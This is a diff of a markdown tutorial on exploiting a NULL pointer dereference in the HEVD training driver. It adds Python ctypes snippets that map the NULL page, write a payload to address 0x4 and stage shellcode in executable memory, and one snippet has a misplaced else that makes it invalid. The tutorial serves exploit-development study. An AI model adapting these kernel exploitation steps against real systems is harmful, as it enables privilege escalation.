@@ -76,15 +76,13 @@ Which can use with Python to easily calculate the IOCTL for this scenario.
 
 Once we have the IOCTL we need, we can quickly use IDA Pro's plugin again to obtain the symlink driver device name so we can fuzz it for a BSOD crash. We can use the kDriverFuzzer with the discovered IOCTL and device name to crash the system.
 
-![fuzzer]()
-
 ----
 
 **Memory management exploitation**
 
 For the memory manipulation/exploitation aspect of a NULL Pointer Dereference vulnerability POC, you will need to utilize the `NtAllocateVirtualMemory` function for allocating the NULL memory page.
 
-`NtAllocateVirtualMemory`
+**NtAllocateVirtualMemory**
 
 ```c++
 __kernel_entry NTSYSCALLAPI NTSTATUS NtAllocateVirtualMemory(
@@ -99,9 +97,19 @@ __kernel_entry NTSYSCALLAPI NTSTATUS NtAllocateVirtualMemory(
 
 The break down for this MSDN Microsoft function is as follows.
 
-- You set the process handler that you want the mapping to occur with. Then you provide the base address of the allocated region page, in this case, it's `0x4` which can be found in the TriggerNullPointerDErefence function in IDA Pro with the code `call dword ptr [esi+4]` this is going to be the location will be writing to. The other important parts of this function definition are the region size and allocation type, for this case we are going to use a 
+- You set the process handler that you want the mapping to occur with which is `0xFFFFFFFF`. Then you provide a pointer to the variable that will obtain the base address of the allocated region of pages which our parameter will be filled out with `byref(c_void_p(0x1))`. Next, the `BaseAddress` parameter is going to be set to 0. The other important parts of this function definition are the region size and allocation type.
 
-`WriteProcessMemory`
+For our HEVD exploit, using Python you can write out this function like so.
+
+```python
+dwStatus = ntdll.NtAllocateVirtualMemory(0xFFFFFFFF, byref(baseadd), 0, byref(c_ulong(0x100)), 0x3000, 0x40)
+if dwStatus != STATUS_SUCCESS:
+    print("[+] Failed allocating the null paged memory: %s" % dwStatus)
+    else:
+        print("\t[+] Successfully allocated NULL memory page")
+```
+
+**WriteProcessMemory**
 
 ```c++
 BOOL WriteProcessMemory(
@@ -111,6 +119,29 @@ BOOL WriteProcessMemory(
   SIZE_T  nSize,
   SIZE_T  *lpNumberOfBytesWritten
 );
+```
+
+After we allocate the NULL page, we can write to the location via the `WriteProcessMemory` function, the way this works parameter by parameter is as follows. The `hProcess` member is a handle to the process memory that's going to be modified, which is our current process. You can either use a Python ctypes `GetCurrentProcess()` function or provide it with `0xFFFFFFF`, then you provide the base address of the allocated region page that we want to write to, in this case, it's `0x00000004` which can be found in the TriggerNullPointerDerefence function in IDA Pro with the code `call dword ptr [esi+4]` this is going to be the location will be writing to.
+
+FOr our HEVD exploit in Python you can use this function as so.
+
+```python
+if kernel32.WriteProcessMemory(0xFFFFFFFF, 0x00000004, payload_final, 0x400, byref(c_ulong())):
+    print("[+] success writing to memory")
+```
+
+----
+
+**Proper shellcode creation/management**
+
+Beyond using the allocation and write functions for our exploitation, we will also need to use some new functions for creating a pointer to our shellcode, which is going to be our payload that we write into memory to have the NULL pointer pointing at. 
+
+We can use the `VirtualAlloc()` function combined with the `RtlMoveMemory()` function to take our shellcode and obtain the pointer to it. 
+
+```python
+ptr = kernel32.VirtualAlloc(c_int(0), c_int(len(shellcode)), c_int(0x3000), c_int(0x40))
+buff = (c_char * len(shellcode)).from_buffer(shellcode)
+kernel32.RtlMoveMemory(c_int(ptr), buff, c_int(len(shellcode)))
 ```
 
 ----
